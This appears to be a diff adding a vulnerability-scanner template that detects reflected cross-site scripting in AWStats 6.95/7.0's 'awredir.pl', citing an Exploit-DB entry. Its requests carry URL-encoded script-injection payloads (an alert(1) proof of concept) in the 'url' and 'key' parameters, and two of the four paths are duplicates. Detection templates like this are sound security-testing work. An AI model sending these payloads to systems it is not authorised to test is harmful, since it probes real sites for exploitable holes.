@@ -1,0 +1,29 @@
+id: AWStats-multiXSS
+
+info:
+  name: AWStats 6.95/7.0 - 'awredir.pl' Multiple Cross-Site Scripting Vulnerabilities
+  author: osamahamad
+  severity: high
+  description: https://www.exploit-db.com/exploits/36164
+  reference: https://www.exploit-db.com/exploits/36164
+  tags: custom
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/awredir.pl?url=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+      - "{{BaseURL}}/awredir.pl?key=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+      - "{{BaseURL}}/awstats/awredir.pl?url=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+      - "{{BaseURL}}/awstats/awredir.pl?url=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"/><script>alert(1)</script>'
+        part: body 
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
